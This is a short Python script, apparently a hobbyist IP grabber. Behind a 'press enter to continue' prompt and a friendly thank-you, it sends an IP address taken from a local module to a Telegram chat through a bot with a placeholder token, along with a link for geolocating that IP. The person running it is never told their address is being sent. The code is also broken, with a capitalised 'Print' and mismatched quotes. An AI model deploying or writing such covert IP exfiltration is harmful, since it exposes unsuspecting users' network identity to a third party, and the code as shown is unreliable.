input("pres enter to continue...")
from test import ip

import telepot

TOKEN="xxxxxxxxxxxxxxxxxxxxxxxxx"
chat_id="xxxxxxxxxxxxxx"

bot=telepot.Bot(TOKEN)
bot.sendMessage(chat_id,ip )
bot.sendMessage(chat_id,'https://whatismyipaddress.com/ip/' + ip)

Print("thank you to have used my bot')

bot.sendMessage(chat_id,'enjoy ;)')
